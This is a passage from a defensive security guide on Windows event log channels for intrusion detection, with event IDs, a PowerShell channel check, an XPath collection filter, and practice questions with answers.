**Security-Mitigations (KernelMode and UserMode).** This is where Windows' exploit protection (formerly Exploit Guard, and before that the separate EMET tool which wrote to the Application channel) records when a mitigation such as arbitrary-code-guard or a ROP check blocked or audited something. A block here usually means **someone tried to exploit a program on this machine** (T1203 Exploitation for Client Execution) — high value, low volume. Related Defender features (attack surface reduction, controlled folder access, network protection) record their blocks in the Defender channel. The point is the same either way: prevention should also be detection. If a control silently stops an attack and nobody looks, you've missed the attacker's *next* attempt, which might work.

**CodeIntegrity/Operational.** App Control for Business (formerly WDAC) writes its decisions here: **3076** = "would have been blocked" (audit mode), **3077** = blocked (enforce mode), plus events about policy activation and about drivers and images that fail signing requirements. Attackers loading an unsigned or vulnerable driver (BYOVD, often for disabling EDR — T1562.001) or a payload from a user-writable folder show up here.

**AppLocker (several channels).** One channel per rule collection — `EXE and DLL`, `MSI and Script`, `Packaged app-Execution`, `Packaged app-Deployment`. 8002/8003/8004 = allowed / audited ("would have been blocked") / blocked for EXE and DLL; 8005/8006/8007 the same for scripts and MSI. As with every application control, a block is both a prevention and a signal that something tried to run where it shouldn't (see [Application Control, FIM and Catching Persistence](../endpoint-defense/appcontrol-fim-persistence.md)).

**Windows Defender/Operational.** The built-in antivirus logs detections (**1116** detected, **1117** action taken, 1006/1007 for older-style detections) and configuration and health changes (**5001** real-time protection disabled, **5007** configuration changed — e.g. an exclusion added, **5013** tamper protection blocked a change). If your Defender alerts reach you through a central console (Microsoft Defender for Endpoint or a management product), this channel is a backup; if not, it's your only antivirus visibility. Tampering events matter most: an attacker disabling real-time protection or adding `C:\Users\Public\` as an exclusion (T1562.001) is preparing to drop something.

**Windows Firewall With Advanced Security/Firewall.** Records when firewall rules or profiles change. The same changes can also appear in Security (4946–4950) when the audit subcategory "MPSSVC Rule-Level Policy Change" is enabled. Attackers add allow rules for their tools or turn profiles off (T1562.004). The channel is noisy — applications add and update rules all the time — so filter to rules added by unexpected processes or to profile changes. **[Changed]** On recent Windows 11 builds the event IDs for rule changes in this channel differ from older builds (for example 2097 where older builds used 2004), so check provider + ID on your own build before writing the filter.

**Sysmon/Operational.** If Sysmon is installed, collecting its channel is the whole point of installing it: process creation with hashes and parent command line (1), network connections per process (3), image loads (7), remote thread creation (8), process access such as opening LSASS (10), file creation (11), registry changes (12–14), DNS queries per process (22) and more.

**[Supplement] Channels that matter in real intrusions but are often forgotten:**

| Channel | Why | Key event IDs |
| --- | --- | --- |
| `Microsoft-Windows-TaskScheduler/Operational` | Scheduled-task persistence and execution (T1053.005) | 106 (registered), 140 (updated), 141 (deleted), 200/201 (action started/completed) |
| `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` | RDP session logon/reconnect/disconnect with source IP (T1021.001) | 21, 24, 25 |
| `Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational` | RDP network connection accepted, before logon | 1149 |
| `Microsoft-Windows-WMI-Activity/Operational` | WMI permanent event subscriptions — fileless persistence (T1546.003) | 5861 |
| `Microsoft-Windows-Bits-Client/Operational` | BITS jobs used to download or persist (T1197) | 3, 59, 60 |

### Checking what is actually turned on { #check-channels }

A channel you plan to collect is useless if it is disabled on the host. Check:

```
PS C:\> 'Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-Sysmon/Operational',
>> 'Microsoft-Windows-TaskScheduler/Operational','Microsoft-Windows-DNS-Client/Operational' |
>>   ForEach-Object { Get-WinEvent -ListLog $_ -ErrorAction SilentlyContinue } |
>>   Format-Table LogName, IsEnabled, RecordCount, MaximumSizeInBytes -AutoSize

LogName                                      IsEnabled RecordCount MaximumSizeInBytes
-------                                      --------- ----------- ------------------
Microsoft-Windows-PowerShell/Operational          True       11702           15728640
Microsoft-Windows-TaskScheduler/Operational       True        4410           10485760
Microsoft-Windows-DNS-Client/Operational         False           0            1052672
```

- The first two lines build a list of channel names and pass each one (`ForEach-Object`, `$_` = the current name) to `Get-WinEvent -ListLog`, which returns the channel's settings.
- `-ErrorAction SilentlyContinue` — channels that don't exist on this host produce no row instead of an error.
- `Microsoft-Windows-PowerShell/Operational True 11702` — enabled and filling. (Enabled is not the same as script block logging being on — check that `ScriptBlockText` events actually appear.)
- **No Sysmon row at all** — the channel doesn't exist, so Sysmon isn't installed here. Your Sysmon-based detections are blind on this host.
- `DNS-Client/Operational False 0` — present but disabled (the default). Per-process DNS lookups from this channel are useful, but you have to enable it first.

### Collecting only what you need from noisy channels { #filtering }

You don't have to take every event from every channel. Windows uses XPath filters — the same syntax in Event Viewer custom views, Windows Event Forwarding subscriptions, `Get-WinEvent -FilterXml` and many agents:

```xml
<QueryList>
  <Query Id="0" Path="Microsoft-Windows-PowerShell/Operational">
    <Select Path="Microsoft-Windows-PowerShell/Operational">*[System[(EventID=4103 or EventID=4104)]]</Select>
  </Query>
  <Query Id="1" Path="Microsoft-Windows-Windows Defender/Operational">
    <Select Path="Microsoft-Windows-Windows Defender/Operational">*[System[(EventID=1116 or EventID=1117 or EventID=5001 or EventID=5007 or EventID=5013)]]</Select>
  </Query>
</QueryList>
```

- `<QueryList>` — a container for one or more queries.
- `<Query Id="0" Path="…">` — query number 0, on the PowerShell channel.
- `<Select Path="…">` — take events from this channel that match the expression.
- `*[System[(EventID=4103 or EventID=4104)]]` — XPath: "any event (`*`) whose System section has EventID 4103 or 4104". The filter runs on the **System** fields, which is exactly why they're standardised. (Filtering on EventData values is possible too, e.g. `*[EventData[Data[@Name='LogonType']='10']]`, but it's slower and only some tools support it.)
- `<Query Id="1" …>` — a second query on the Defender channel, keeping detections and tampering events and dropping routine signature-update chatter.

**[Caution]** Filter at the source carefully. Every event you drop on the host is gone forever for that purpose. A good rule: filter only channels that are both noisy and well understood, keep everything from Security (tune the audit policy instead), and document what you dropped so the "zero results" question from the previous page can be answered.

## Section summary: what you should be able to answer { #summary }

Windows logging is complicated, and it is very different from Linux (next section). The reason to go this deep is simple: if you can't read an event's contents, don't know where it came from, and don't know what was collected and filtered, finding a breach becomes much harder — and if you aren't collecting the channels modern attacks show up in, you've handicapped yourself before the attack starts.

Answer these four questions for your own environment, and revisit them whenever something changes:

1. **What is our Windows audit policy, and do we have extra programs producing events?** (Effective policy on real hosts via `auditpol`; Sysmon and its config; EDR; scripts writing to custom channels.)
2. **What writes logs outside the Windows event system?** (IIS, DNS debug logs, databases, vendor products under `C:\ProgramData`, scheduled scripts writing text files — and are any of them collected?)
3. **Which channels and other data sources are we collecting?** (The table above as a checklist; per host type — workstation, server, domain controller — not one list for all.)
4. **In the SIEM, do we see the XML fields, the message, or both — and are all fields parsed?** (Pick three events — a 4624, a 1102 with UserData and a 4104 — and check that every field you need is a searchable field, not buried in text.)

Each of these questions maps to a way an investigation can go wrong: missing events (1), missing sources (2), missing channels (3), and data that's there but unsearchable (4).

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    The event structure is unchanged: every event is XML with a System section and an EventData or UserData section, providers ship versioned templates and descriptions, `Get-WinEvent -ListProvider` and `wevtutil gp` still dump them, and the message is still rendered at view time from the description plus EventData. 4624 version 2 with its 27 fields, `TargetLogonId` as the session pivot, `Execution ProcessID` being the writer, and 1102 using UserData are all as described. Security, PowerShell/Operational, Defender/Operational, CodeIntegrity, AppLocker, Security-Mitigations, Firewall, TaskScheduler, TerminalServices, WMI-Activity and Sysmon remain the channels worth collecting, and "send structured fields, not message text" is now standard practice.

!!! info "[Changed] What has changed"
    - **Names.** Windows Defender ATP is now **Microsoft Defender for Endpoint**; Windows Defender Application Control is now **App Control for Business** (same CodeIntegrity channel and 3076/3077 events); Exploit Guard's features now sit under Defender's exploit protection and ASR. **EMET** has been out of support since 2018 — its Application-channel events only matter on legacy systems.
    - **Sysmon is built into Windows 11** as an optional feature since the February 2026 optional update (KB5077241), off by default; it still needs to be enabled and configured, and its channel still has to be collected.
    - **PowerShell 7** logs to `PowerShellCore/Operational`, separate from Windows PowerShell's `Microsoft-Windows-PowerShell/Operational`. A collection list from the Windows-PowerShell-only era misses it.
    - **Firewall channel event IDs** for rule changes differ on recent Windows 11 builds from the older 2004/2005/2006, so filters written years ago may silently match nothing.
    - **Schemas.** SIEMs and data lakes increasingly normalise Windows events into common schemas (Elastic Common Schema, the Open Cybersecurity Schema Framework, Sentinel's ASIM). The raw EventData names remain the ground truth that those mappings are built from.
    - **Not everything is in a channel.** Many organisations now rely on EDR telemetry and cloud identity logs for much of what used to come from local channels. Those complement, not replace, the endpoint channels.

!!! warning "[Caution] Wrong or risky to do the old way"
    - **Don't parse the message with regular expressions** — localisation, versions, duplicated labels and optional lines make it silently wrong. Parse EventData/UserData.
    - **Don't read `Execution ProcessID` as the process involved.** It's the writer (LSASS for Security).
    - **Don't assume `EventData/Data[@Name]` covers everything** — check that your pipeline handles UserData events such as 1102, and unnamed `<Data>` items from classic sources.
    - **Don't exact-match padded or truncated fields** such as `LogonProcessName "User32 "`; trim first.
    - **Don't stop at Security, System and Application.** Without PowerShell/Operational (with script block logging on) and Sysmon or EDR, in-memory PowerShell attacks are close to invisible.
    - **Don't trust a channel list without checking the hosts** — disabled channels (`IsEnabled False`) and missing Sysmon look exactly like "no activity".
    - **Don't reuse old firewall or Defender event ID filters on new builds** without confirming the IDs still match.

## Practice questions { #quiz }

### Question 1

Your SIEM shows a 4624 on `APP-03` with `Execution ProcessID = 788` and `ProcessName = C:\Windows\System32\svchost.exe`. A colleague says: "The logon was done by process 788, so let's look for process 788 in the Sysmon logs to see what it ran." What's wrong with this reasoning, and which field should they pivot on to see what the logged-on user did afterwards?

??? success "Answer and explanation"
    `Execution ProcessID` is in the **System** section and identifies the process that **wrote** the event. For the Security channel that is always LSASS (PID 788 here), so looking at "what PID 788 ran" tells you nothing about the user. `ProcessName`/`ProcessId` in EventData is the process that *requested* the logon (here the RDP service), also not the user's activity.

    To follow the user, pivot on **`TargetLogonId`** (here `0x1d4f2a8`). Every later event from that session carries the same value: `SubjectLogonId` in 4688 process creation and 4672 special privileges, `LogonId` in Sysmon events (Sysmon 1 has a `LogonId` field), and the matching 4634/4647 logoff. Add `Computer = APP-03` because logon IDs are only unique per machine and boot.

### Question 2

Your SIEM parser extracts fields from Windows events by reading `EventData/Data` elements by name. During an incident you search for Security 1102 on all servers and find events — but the user name field is empty in every one. Meanwhile, events written by a nightly admin-check script (created with `Write-EventLog`) show only fields called `param1`. Explain both problems and what to change.

??? success "Answer and explanation"
    Both come from assuming every event has the same EventData shape.

    - **1102** doesn't use `<EventData><Data Name=…>`. It carries a **UserData** section with a provider-specific element (`<LogFileCleared>`) whose children are `SubjectUserName`, `SubjectLogonId` and so on. A parser that only reads `EventData/Data[@Name]` finds no fields. Fix the parser (or agent setting) to flatten UserData as well, and test it on a real 1102. (Note too that 1102 is written by the `Microsoft-Windows-Eventlog` provider, not the auditing provider — a filter on provider `Security-Auditing` would miss it entirely.)
    - **`Write-EventLog`** creates classic events with **unnamed** `<Data>` values, so the parser can only number them. Either accept `param1` and document what it holds, have the script write structured text (for example `key=value` or JSON) in the message and parse that, or write the events with a proper manifest-based provider that defines named fields.

### Question 3

You're asked to review the Windows log collection for a new site. The agent config collects Security, System and Application from every host, plus `Microsoft-Windows-Windows Firewall With Advanced Security/Firewall` with a filter for event IDs 2004, 2005 and 2006 that someone copied from an old guide. Name the most important gaps you'd raise, in priority order, and how you'd confirm each on a host.

??? success "Answer and explanation"
    A sensible priority order:

    1. **PowerShell/Operational** (and `PowerShellCore/Operational` if PowerShell 7 is present) is not collected — and script block logging may not be enabled. Without it, in-memory PowerShell attacks (T1059.001) are nearly invisible. Confirm with `Get-WinEvent -ListLog` and by checking that 4104 events actually exist.
    2. **Sysmon/Operational** or EDR telemetry. Check whether Sysmon is installed/enabled (the channel exists?) and whether an EDR covers the gap; if Sysmon is present, collect its channel.
    3. **Defender/Operational** — detections (1116/1117) and tampering (5001/5007/5013), unless the central Defender console already reaches the SOC.
    4. **CodeIntegrity/Operational, AppLocker and Security-Mitigations** — wherever App Control, AppLocker or exploit protection are deployed, so that blocks become alerts.
    5. **TaskScheduler, TerminalServices, WMI-Activity, Bits-Client** — persistence and RDP evidence that the big three don't give in full.
    6. **The firewall filter.** Check which IDs that channel actually produces on the site's Windows builds; on recent Windows 11 builds rule changes use different IDs, so the copied 2004/2005/2006 filter may collect nothing. Also consider the Security 4946–4950 events via the audit policy.

    Finally, check the audit policy itself with `auditpol` on a sample of hosts — collecting Security is pointless if the subcategories you need are off.

## Related { #related }

- [Windows Logging](index.md) — section overview
- [How Windows Event Logging Works](how-event-logging-works.md) — providers, channels, the log path, audit settings and the three views
- [Application Control, FIM and Catching Persistence](../endpoint-defense/appcontrol-fim-persistence.md) — where AppLocker and CodeIntegrity events come from
- [Windows Event Logs (EVTX)](../../../windows/event-logs.md) · [Windows Event IDs](../../../basics/windows-event-ids.md) · [PowerShell download cradles](../../../adversary/powershell-cradles.md) · [Impair defences and log clearing](../../../adversary/impair-defenses-log-clearing.md)
